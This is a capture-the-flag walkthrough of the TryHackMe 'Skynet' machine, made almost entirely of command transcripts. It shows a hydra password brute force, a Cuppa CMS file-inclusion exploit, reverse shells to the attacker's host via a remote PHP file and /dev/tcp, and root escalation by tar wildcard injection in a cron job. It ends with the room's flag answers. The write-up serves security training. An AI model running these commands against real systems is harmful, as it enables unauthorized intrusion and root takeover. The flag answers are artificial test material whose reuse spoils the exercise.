# Skynet

A vulnerable Terminator themed Linux machine.

[Skynet](https://tryhackme.com/room/skynet)

## Topic's

- Network Enumeration
- Web Enumeration
- SMB Enumeration
- Brute Forcing (http-post-form)
- Local File Inclusion
- Directory Traversal
- Exploiting Crontab

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy and compromise the vulnerable machine!

Hasta la vista, baby.

Are you able to compromise this Terminator themed machine?

You can follow our official walkthrough for this challenge on [our blog](https://blog.tryhackme.com/skynet-writeup/).

```
kali@kali:~/CTFs/tryhackme/Skynet$ sudo nmap -sS -sC -sV -O 10.10.154.180
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 11:13 CEST
Nmap scan report for 10.10.154.180
Host is up (0.039s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL TOP AUTH-RESP-CODE UIDL RESP-CODES PIPELINING CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR Pre-login LITERAL+ have OK post-login LOGIN-REFERRALS ID listed capabilities more LOGINDISABLEDA0001 IDLE IMAP4rev1 ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=33185%PV=Y%DS=2%DC=I%G=Y%TM=5F856F
OS:D3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-10-13T04:13:54-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-13T09:13:54
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ smbclient -L 10.10.154.180
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ gobuster dir -u 10.10.154.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.180
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/13 11:14:13 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
Progress: 107987 / 220561 (48.96%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/13 11:22:16 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
kali@kali:~/CTFs/tryhackme/Skynet$ cat logs/log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ hydra -l milesdyson -P logs/log1.txt 10.10.154.180 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-13 11:23:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.154.180:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[80][http-post-form] host: 10.10.154.180   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-13 11:23:59
```

[http://10.10.154.180/squirrelmail/src/webmail.php](http://10.10.154.180/squirrelmail/src/webmail.php)

![](./2020-10-13_11-25.png)

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ smbclient -U milesdyson //10.10.154.180/milesdyson
Enter WORKGROUP\milesdyson's password:
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Tue Sep 17 11:05:47 2019
  ..                                  D        0  Wed Sep 18 05:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 11:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 11:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 11:05:14 2019
  notes                               D        0  Tue Sep 17 11:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 11:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 11:05:14 2019

                9204224 blocks of size 1024. 5361632 blocks available
smb: \> cd notes
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \notes\>
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ gobuster dir -u http://10.10.154.180/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.180/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/13 11:31:22 Starting gobuster
===============================================================
/administrator (Status: 301)
Progress: 10052 / 220561 (4.56%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/13 11:32:06 Finished
===============================================================
```

[http://10.10.154.180/45kra24zxs28v3yd/administrator/](http://10.10.154.180/45kra24zxs28v3yd/administrator/)

![](./2020-10-13_11-33.png)

[Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion](https://www.exploit-db.com/exploits/25971)

[view-source:http://10.10.154.180/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd](view-source:http://10.10.154.180/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd)

```
<script>
	function CloseDefaultAlert(){
		SetAlert(false, "", "#alert");
		setTimeout(function () {SetBlockade(false)}, 200);
	}
	function ShowAlert(){
		_width = '';
		_height = '';
		jQuery('#alert').animate({width:parseInt(_width), height:parseInt(_height), 'margin-left':-(parseInt(_width)*0.5)+20, 'margin-top':-(parseInt(_height)*0.5)+20 }, 300, "easeInOutCirc", CompleteAnimation);
			function CompleteAnimation(){
				jQuery("#btnClose_alert").css('visibility', "visible");
				jQuery("#description_alert").css('visibility', "visible");
				jQuery("#content_alert").css('visibility', "visible");
			}
	}
</script>
<div class="alert_config_field" id="alert" style="z-index:;">
    <div class="btnClose_alert" id="btnClose_alert" onclick="javascript:CloseDefaultAlert();"></div>
	<div class="description_alert" id="description_alert"><b>Field configuration: </b></div>
    <div class="separator" style="margin-bottom:15px;"></div>
    <div id="content_alert" class="content_alert">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
    </div>
</div>
```

[http://10.10.154.180/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.106.222/php-reverse-shell.php](<[/alerts/alertConfigField.php?urlConfig=http://10.8.106.222/php-reverse-shell.php](http://10.10.154.180/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.106.222/php-reverse-shell.php)>)

```
kali@kali:~/CTFs/tryhackme/Skynet$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.154.180] 53188
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 04:37:47 up 25 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
```

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@skynet:/home/milesdyson$ clear
clear
TERM environment variable not set.
www-data@skynet:/home/milesdyson$ ls -l
ls -l
total 16
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cd backups
cd backups
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```
www-data@skynet:/home/milesdyson/backups$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.106.222/9002 0>&1' > /var/www/html/shell
<bin/bash\nbash -i >& /dev/tcp/10.8.106.222/9002 0>&1' > /var/www/html/shell
www-data@skynet:/home/milesdyson/backups$ chmod +x /var/www/html/shell
chmod +x /var/www/html/shell
www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint=1
www-data@skynet:/home/milesdyson/backups$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
<dyson/backups$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
www-data@skynet:/home/milesdyson/backups$ ls -l /var/www/html
ls -l /var/www/html
total 64
-rw-rw-rw- 1 www-data www-data     0 Oct 13 04:43 --checkpoint-action=exec=bash shell
-rw-rw-rw- 1 www-data www-data     0 Oct 13 04:43 --checkpoint=1
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    54 Oct 13 04:42 shell
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/home/milesdyson/backups$
```

```
kali@kali:~/CTFs/tryhackme/Skynet$ nc -lnvp 9002listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.154.180] 33774
bash: cannot set terminal process group (2185): Inappropriate ioctl for device
bash: no job control in this shell
root@skynet:/var/www/html# cd
cd
root@skynet:~# ls
ls
root.txt
root@skynet:~# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949
```

1. What is Miles password for his emails?

`cyborg007haloterminator`

2. What is the hidden directory?

`/45kra24zxs28v3yd`

3. What is the vulnerability called when you can include a remote file for malicious purposes?

`remote file inclusion`

4. What is the user flag?

`7ce5c2109a40f958099283600a9ae807`

5. What is the root flag?

`3f0372db24753accc7179a282cd6a949`
